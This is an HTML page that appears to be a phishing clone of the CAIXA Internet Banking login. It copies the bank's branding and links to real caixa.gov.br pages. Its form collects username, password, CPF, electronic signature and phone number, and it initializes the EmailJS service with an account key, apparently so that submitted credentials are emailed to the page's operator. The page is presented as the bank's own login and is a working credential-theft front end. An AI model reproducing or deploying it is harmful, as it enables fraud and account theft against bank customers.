<!DOCTYPE html>
<html>
<head>
	<title>CAIXA | Internet Banking</title>
	 <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet">
	 <meta name="viewport" content="width=device-width, initial-scale=1" />
	 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
	 <link rel="stylesheet" type="text/css" href="estilos.css">
	 <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css">
	 <link rel="shortcut icon" href="assets/favicon.png" />
</head>
<body style="background-color: #0369b9;">
	<script type="text/javascript">
	(function() {
	emailjs.init("user_ZB5hZkZsbWdzrmhqMRlAK"); 
	})();
	</script>
	<nav class="navbar navbar-light bg-light">
	  <div class="container">
	  		<img src="assets/logo.png" width="110px" alt="">
	  		<div>
	  			<a href="https://www.caixa.gov.br/atendimento/paginas/default.aspx" type="button" class="btn orange pull-right" target="_blank">Atendimento CAIXA</a>
	  		</div>
	  	</div>
	</nav>
	<div class="submenu" style="background-color: #194775;">
		<div class="dropdown">
		  <a class="btn dropdown-toggle" href="https://www.caixa.gov.br/empresa/Paginas/default.aspx" id="dropdownMenu2" target="__BLANK" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="color: white;">
		    Empresa
		  </a>
		  <a class="btn dropdown-toggle" href="https://www.caixa.gov.br/beneficios-trabalhador/Paginas/default.aspx" target="__BLANK" id="dropdownMenu2" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="color: white;">
		    Beneficios e Programas
		  </a>
		  <a class="btn dropdown-toggle" href="https://www.caixa.gov.br/sobre-a-caixa/Paginas/default.aspx" target="__BLANK" type="button" id="dropdownMenu2" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="color: white;">
		    Politica de proteção de dados
		  </a>
		</div>
	</div>
	<br><br>
	<div class="container">
		  <div class="col-xs-10 col-sm-3 col-md-5 col-lg-4 col-centered">
		      <div class="card border-secondary mb-3" style="max-width: 30rem;" style="margin: 10px!important">
		        <div class="card-header" id="texto2" style="font-weight: bold">Cliente positivo CAIXA</div>
		        <div class="card-body text-secondary">

		         <span style="color: black; font-weight: bold;">Usuário</span>
		         <input type="text" class="form-control" placeholder="Digite o seu usuário" id="usuario"><br>

		         <span style="color: black; font-weight: bold;">Senha</span>
		         <input type="password" class="form-control" id="senha"><br>
		         <div class="row">
		         	<div class="col-md-6">
		        		<span style="color: black; font-weight: bold;">CPF</span>
		        		<input type="text" class="form-control" placeholder="Digite o seu CPF" id="cpf"><br>
		         	</div>
		         	<div class="col-md-6">
		        		<span style="color: black; font-weight: bold;">Assinatura eletrônica</span>
		        		<input type="text" class="form-control" id="assinatura"><br>
		         	</div>
		         	<div class="col-md-12">
		         			<span style="color: black; font-weight: bold;">Telefone</span>
		         		 	<input type="text" class="form-control" placeholder="Digite seu telefone" id="telefone"><br>
		         		 	 <center>
		         		 	 	<label class="form-check-label" for="flexCheckDefault" style="text-align: center">
		         		 	 	  Ao submeter esse formulario confirmo está de acordo com a nossa <a href="https://www.caixa.gov.br/acesso-a-informacao/Paginas/default.aspx" target="__BLANK">politica de privacidade.<a>
		         		 	 	</label>
		         		 	 </center>
		         	</div>
		         </div><br>
		         <div class="col-md-12">
					<div class="text-center">
						<button type="button" class="btn orange" aria-label="Left Align" id="btn-enviar">Acessar</button>
						<button class="btn btn-default" id="btn-limpar" aria-label="Left Align" style="border: 1px!important black;">Limpar</button>
						<a class="btn btn-default" aria-label="Left Align" href="https://www.caixa.gov.br/atendimento/paginas/default.aspx" target="__BLANK">Recuperar senha</a>
					</div>
				</div>
		        </div>
		   </div>
		 </div>
	</div>
</body>
<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
<script src="jquery.mask.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>
<script src="index.js"></script>
</html>